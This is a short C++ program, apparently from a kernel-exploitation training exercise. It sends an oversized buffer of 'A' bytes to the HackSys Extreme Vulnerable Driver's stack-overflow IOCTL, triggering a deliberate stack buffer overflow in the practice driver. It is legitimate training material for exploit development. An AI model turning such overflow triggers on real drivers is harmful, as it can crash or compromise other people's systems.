#include "Base.h"

int main()
{
	getchar();
	BYTE* inBuffer = (BYTE*)HeapAlloc(
		GetProcessHeap(), HEAP_ZERO_MEMORY, 8096);

	RtlFillMemory(inBuffer, 8096, 'A');
	std::tr1::shared_ptr<BaseIoctl> bp(new BaseIoctl());
	// Open Device 
	bp->OpenDevice();
	bp->sendData((const char *)inBuffer, 8096, HACKSYS_EVD_IOCTL_STACK_OVERFLOW);

	bp->CloseDevice();
	return 0;
}